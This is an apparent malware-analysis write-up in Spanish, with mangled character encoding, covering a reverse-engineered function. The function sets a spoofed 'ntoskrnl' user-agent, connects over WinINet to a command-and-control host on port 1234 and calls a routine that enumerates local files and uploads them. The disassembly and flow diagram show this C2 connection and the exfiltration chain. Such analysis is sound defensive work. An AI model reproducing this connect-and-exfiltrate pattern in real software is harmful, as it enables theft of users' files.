La funci√≥n FUN_00401130 implementa el inicializador de red del malware, estableciendo una conexi√≥n HTTP al servidor de comando y control (C2) y llamando luego a FUN_00401000 ‚Äîfunci√≥n que ya analizamos, encargada de recorrer archivos locales y exfiltrarlos.

üß† RESUMEN DEL COMPORTAMIENTO
Acci√≥n	Descripci√≥n
InternetOpenA	Inicializa WinINet para conexiones HTTP.
InternetConnectA	Se conecta al servidor reversing.rocks en el puerto 1234 (0x4D2).
FUN_00401000	Se ejecuta tras la conexi√≥n: recorre archivos locales y los env√≠a por red.
InternetCloseHandle	Cierra conexiones abiertas.
exit(1)	Termina el proceso si falla alguna de las fases.
üîç AN√ÅLISIS DETALLADO PASO A PASO
1. Inicializa WinINet

0040113a PUSH s_ntoskrnl_0040211c  ; "ntoskrnl" como User-Agent
0040113f CALL [InternetOpenA]

    Utiliza "ntoskrnl" como user-agent spoofing, simulando una cadena del kernel de Windows.

    Resultado en EDI.

2. Comprobaci√≥n de √©xito

00401147 TEST EDI, EDI
00401149 JNZ  -> continua si √©xito
0040114b PUSH 1
0040114d CALL exit

    Si InternetOpenA falla, termina.

3. Establece conexi√≥n HTTP con C2

0040115d PUSH 0x4d2                ; puerto 1234
00401162 PUSH s_reversing.rocks   ; host remoto
00401168 CALL [InternetConnectA]

    Se conecta al servidor remoto reversing.rocks, puerto 1234 (puerto no est√°ndar ‚Üí comportamiento sospechoso).

4. Valida conexi√≥n

00401170 TEST ESI, ESI
00401172 JNZ -> contin√∫a si √©xito
00401174 ... exit(1)

    Si falla, cierra conexi√≥n inicial y termina.

5. Llama a la funci√≥n principal (FUN_00401000)

00401185 CALL FUN_00401000

    En este punto se lanza la l√≥gica principal: escaneo de archivos + env√≠o de datos.

6. Limpieza final

00401191 CALL [InternetCloseHandle] ; Cierra handle ESI (conexi√≥n al host)
00401194 CALL [InternetCloseHandle] ; Cierra handle EDI (InternetOpenA)

7. Retorno

00401197 XOR EAX,EAX
00401199 POP ESI
0040119a RET

    Devuelve 0 (success).

‚ò†Ô∏è INDICIOS MALICIOSOS  
Evidencia t√©cnica	Comportamiento
InternetOpenA, InternetConnectA	Se conecta a un servidor externo.
"ntoskrnl" como user-agent	Intenta parecer un componente del sistema.
Conexi√≥n a reversing.rocks:1234	C2 probablemente malicioso.
Llama a funci√≥n que escanea archivos y los env√≠a	Exfiltraci√≥n de datos.
üîÑ FLUJO GENERAL

[InternetOpenA ("ntoskrnl")] ‚Üí [InternetConnectA ("reversing.rocks", 1234)] 
  ‚îî‚îÄ> Si √©xito ‚Üí [FUN_00401000: Enumeraci√≥n + exfiltraci√≥n]
        ‚îî‚îÄ> [FindFirstFileA ‚Üí HttpOpenRequestA ‚Üí InternetWriteFile ...]
  ‚îî‚îÄ> Luego cierra todo y retorna 0

‚úÖ Conclusi√≥n

Esta funci√≥n sirve como fase de inicializaci√≥n de red del malware, y es claramente parte de una infraestructura de C2 (comando y control):

    El binario establece una conexi√≥n a internet y sube archivos locales a un dominio externo.

    Emplea API leg√≠timas de Windows para ello, lo que lo hace m√°s evasivo frente a antivirus.
